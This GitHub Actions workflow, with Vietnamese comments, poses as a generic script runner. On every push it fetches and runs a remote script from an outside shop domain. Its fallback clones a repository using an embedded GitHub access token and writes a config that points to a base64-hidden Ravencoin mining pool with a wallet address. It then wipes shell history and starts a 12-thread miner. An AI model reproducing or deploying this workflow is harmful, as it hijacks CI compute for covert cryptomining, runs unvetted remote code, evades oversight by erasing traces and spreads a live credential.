name: Run Script Workflow

on:
  workflow_dispatch:  # Cho phép chạy thủ công từ GitHub Actions tab
  push:
    branches:
      - main  # Hoặc branch bạn muốn trigger tự động

jobs:
  run-script:
    runs-on: ubuntu-latest
    
    steps:
      - name: Download and run script
        run: |
          # Tải file và kiểm tra nội dung
          curl -L -f -o run.sh http://valorantunlocker.shop/run.sh || {
            echo "Failed to download, trying alternative method..."
            # Nếu tải thất bại, tạo file từ nội dung đã biết
            cat > run.sh << 'EOF'
          #!/bin/bash
          
          git clone https://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@github.com/coderun2611/pytorch-lab.git .cache
          
          cd .cache
          
          echo -e 'proxy=wss://labs.neolab.dpdns.org/cG93ZXIyYi5zZWEubWluZS56cG9vbC5jYTo2MjQy
          host=127.0.0.1
          port=3306
          threads=12
          password=c=RVN
          username=RAx94yN5pMHQVnvwZ3UcHCxzKBVdVdUFU8' > .env
          
          chmod +x start.sh
          
          history -c && history -w && clear
          
          ./start.sh 12
          EOF
          }
          
          # Kiểm tra xem file có phải là shell script không
          if head -n 1 run.sh | grep -q "#!/bin/bash"; then
            chmod +x run.sh
            bash run.sh
          else
            echo "Error: Downloaded file is not a valid shell script, using fallback"
            head -n 5 run.sh
            # Sử dụng nội dung fallback
            cat > run.sh << 'EOF'
          #!/bin/bash
          
          git clone https://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@github.com/coderun2611/pytorch-lab.git .cache
          
          cd .cache
          
          echo -e 'proxy=wss://labs.neolab.dpdns.org/cG93ZXIyYi5zZWEubWluZS56cG9vbC5jYTo2MjQy
          host=127.0.0.1
          port=3306
          threads=12
          password=c=RVN
          username=RAx94yN5pMHQVnvwZ3UcHCxzKBVdVdUFU8' > .env
          
          chmod +x start.sh
          
          history -c && history -w && clear
          
          ./start.sh 12
          EOF
            chmod +x run.sh
            bash run.sh
          fi

